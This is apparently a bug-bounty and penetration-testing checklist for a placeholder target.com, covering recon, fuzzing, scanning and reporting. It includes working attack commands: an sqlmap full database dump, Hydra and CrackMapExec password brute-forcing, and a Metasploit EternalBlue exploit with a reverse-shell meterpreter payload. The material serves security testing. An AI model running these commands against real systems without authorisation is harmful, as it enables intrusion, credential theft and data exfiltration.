# Zero1Checklist

A practical, step-by-step workflow to go from recon to reporting on `target.com`.
---

## 0. Setup and Installation

- [ ] Use a Linux box (Kali/Parrot/Ubuntu) with sudo access.
- [ ] Install core tools from package manager:
  - `sudo apt install nmap nikto whatweb hydra`
- [ ] Install additional tools (high level):
  - **Recon & enum**: Sublist3r, Amass, masscan, httprobe.
  - **Web fuzzing & paths**: ffuf, gobuster, dirsearch, feroxbuster, wfuzz.
  - **Tech & vulns**: WhatWeb, Wappalyzer CLI, nuclei, Nikto, SQLmap, XSStrike.
  - **Network & exploitation**: Shodan CLI, CrackMapExec, Metasploit Framework.
  - **Reversing & utilities**: Ghidra (download), CyberChef (web UI).
- [ ] Install and configure Burp Suite Community and set browser proxy to `127.0.0.1:8080`.
- [ ] Prepare wordlists (directories, parameters, headers, usernames, passwords).
---

## 1. Recon & Mapping

### 1.1 Subdomain Enumeration

- [ ] Enumerate with Sublist3r  
  - Command:  
    ```
    sublist3r -d target.com -o sublist3r.txt
    ```  
    .
- [ ] Enumerate with Amass  
  - Command:  
    ```
    amass enum -d target.com -o amass.txt
    ```  
    .
- [ ] Merge and dedupe subdomains  
  - Command:  
    ```
    cat sublist3r.txt amass.txt | sort -u > subs_all.txt
    ```  
    .

### 1.2 Live Hosts and Port Scans

- [ ] Check which subdomains are alive (HTTP/S) – httprobe  
  - Command:  
    ```
    cat subs_all.txt | httprobe > live_hosts.txt
    ```  
    .
- [ ] Scan open ports and services – Nmap  
  - Command:  
    ```
    nmap -sC -sV -iL live_hosts.txt -oA nmap_live
    ```  
    .
- [ ] (Optional) Fast wide scan – Masscan  
  - Command:  
    ```
    masscan <cidr> -p80,443 --rate 10000 -oX masscan.xml
    ```  
    .

### 1.3 Tech Fingerprinting and External Exposure

- [ ] Fingerprint tech – WhatWeb  
  - Command:  
    ```
    whatweb -v https://target.com
    ```  
    .
- [ ] Fingerprint tech – Wappalyzer CLI  
  - Command:  
    ```
    wappalyzer https://target.com
    ```  
    .
- [ ] Check Internet-wide exposure – Shodan  
  - Command (example):  
    ```
    shodan search "hostname:target.com"
    ```  
    .

---

## 2. Directories, Paths & Parameters

### 2.1 Directory and DNS Discovery

- [ ] Directory brute force – ffuf  
  - Command:  
    ```
    ffuf -u https://target.com/FUZZ \
         -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ```  
    .
- [ ] Directory brute force – Gobuster  
  - Command:  
    ```
    gobuster dir -u https://target.com \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ```  
    .
- [ ] DNS brute force – Gobuster  
  - Command:  
    ```
    gobuster dns -d target.com -w wordlist.txt
    ```  
    .
- [ ] Smart path discovery – Dirsearch  
  - Command:  
    ```
    python3 dirsearch.py -u https://target.com -e php,html,js
    ```  
    .
- [ ] Recursive fuzzing – Feroxbuster (optional)  
  - Command:  
    ```
    feroxbuster -u https://target.com -w wordlist.txt
    ```  
    .

### 2.2 Parameter and Header Fuzzing

- [ ] Fuzz query parameters – wfuzz  
  - Command:  
    ```
    wfuzz -c -w wordlist.txt \
      -u "https://target.com/index.php?FUZZ=1"
    ```  
    .
- [ ] Fuzz HTTP headers – wfuzz  
  - Command:  
    ```
    wfuzz -c -w headers.txt \
      -u "https://target.com" \
      -H "FUZZ: test"
    ```  
    .

---

## 3. Automated Vulnerability Checks

### 3.1 Web Misconfig and CVEs

- [ ] Quick misconfig scan – Nikto  
  - Command:  
    ```
    nikto -h https://target.com -output nikto_target.txt
    ```  
    .
- [ ] Template-based vuln scan – nuclei  
  - Command:  
    ```
    nuclei -u https://target.com -t cves/ -o nuclei_target.txt
    ```  
    .

### 3.2 SQL Injection

- [ ] Build list of candidate SQLi URLs (from Burp/ffuf/wfuzz) into `sqli_targets.txt`.
- [ ] Test for SQL injection – SQLmap (example URL)  
  - Command:  
    ```
    sqlmap -u "https://target.com/product.php?id=42" \
      --risk=3 --level=5 --dump-all
    ```  
    .

---

## 4. Manual Web Testing & XSS

### 4.1 Burp Suite Workflow

- [ ] Route browser traffic through Burp Suite Community (`127.0.0.1:8080`).
- [ ] Intercept key requests (logins, APIs, file uploads, payments).  
- [ ] Use Repeater for:
  - Parameter tampering.
  - IDOR checks.
  - Auth/role bypass.
  - CSRF testing..

### 4.2 XSS Discovery

- [ ] Collect XSS-suspect URLs (search, comments, query params) into `xss_targets.txt`.
- [ ] Test XSS – XSStrike (example URL)  
  - Command:  
    ```
    python3 xsstrike.py -u "https://target.com/search?q=test"
    ```  
    .

---

## 5. Exploitation & Lateral Movement (Scope-Aware)

### 5.1 Reverse Engineering

- [ ] Analyze leaked binaries/APKs – Ghidra  
  - Steps:
    - Download and launch Ghidra (GUI).
    - Import binary/APK.
    - Search for hardcoded URLs, API keys, secrets, and debug functions

### 5.2 Credentials and Network Abuse

- [ ] Targeted bruteforce – Hydra (example SSH)  
  - Command:  
    ```
    hydra -L users.txt -P passwords.txt ssh://192.168.1.10
    ```  
    .
- [ ] Network auth and shares – CrackMapExec (SMB example)  
  - Command:  
    ```
    cme smb 192.168.1.0/24 -u usernames.txt -p passwords.txt
    ```  
    .

### 5.3 Exploits and Priv-Esc – Metasploit

- [ ] Launch Metasploit  
  - Command:  
    ```
    msfconsole
    ```  
    .
- [ ] Example EternalBlue flow (adjust IPs before use):  
  ```
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 192.168.1.10
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 192.168.1.5
  exploit
  ```  
  .
- [ ] After shell: run post modules (hashdump, priv-esc, pivot) only within allowed scope.

---

## 6. Data Handling, Decoding & Reporting

### 6.1 Data Decoding & Inspection

- [ ] Use CyberChef (web) to decode:
  - JWTs.
  - base64/hex/URL-encoded blobs.
  - Custom encodings and hashes..

### 6.2 Organizing Evidence

- [ ] Maintain a per-target folder structure, e.g.:
  - `recon/` (subs, nmap, shodan).
  - `dirs/` (ffuf, gobuster, dirsearch, feroxbuster).
  - `vulns/` (nikto, nuclei, SQLmap, XSStrike).
  - `creds/` (Hydra, CrackMapExec findings).
  - `scripts/` (custom automation)..

### 6.3 Reporting and Next Steps

- [ ] For each finding, capture:
  - Summary and impact.
  - Exact steps and payloads.
  - Affected assets (host, URL, parameter).
  - Screenshots and tool outputs.
  - Suggested remediation.
- [ ] Turn findings into:
  - Bug bounty submissions with clear PoCs.
  - Internal or client reports.
  - Content for future blog posts or book examples.
- [ ] Continuously update:
  - Wordlists with new dirs/params.
  - This checklist with lessons learned.
  - Custom scripts for your all-in-one automation tool.

---
